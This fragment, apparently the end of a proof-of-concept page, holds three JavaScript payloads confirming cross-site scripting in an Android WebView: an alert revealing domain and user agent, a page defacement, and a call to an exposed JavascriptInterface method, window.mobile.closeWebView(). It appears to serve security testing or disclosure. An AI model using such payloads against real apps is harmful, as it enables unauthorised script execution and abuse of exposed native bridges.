        // Payload 1: Display an alert to confirm JavaScript execution
        alert("XSS Successful! Domain: " + document.domain + "\nUser Agent: " + navigator.userAgent);

        // Payload 2: Change the content of the page to visually confirm XSS
        document.body.innerHTML = "<h1>!!! XSS CONFIRMED !!!</h1><p>Malicious JavaScript executed within the WebView.</p>";

        // Payload 3: Attempt to call the exposed JavascriptInterface 'mobile.closeWebView()'
        // This should immediately close the WebView.
        try {
            console.log("Attempting to call window.mobile.closeWebView()");
            window.mobile.closeWebView();
        } catch (e) {
            console.error("Error calling closeWebView: ", e);
            document.body.innerHTML += "<p>Error calling closeWebView: " + e.message + "</p>";
        }

    </script>
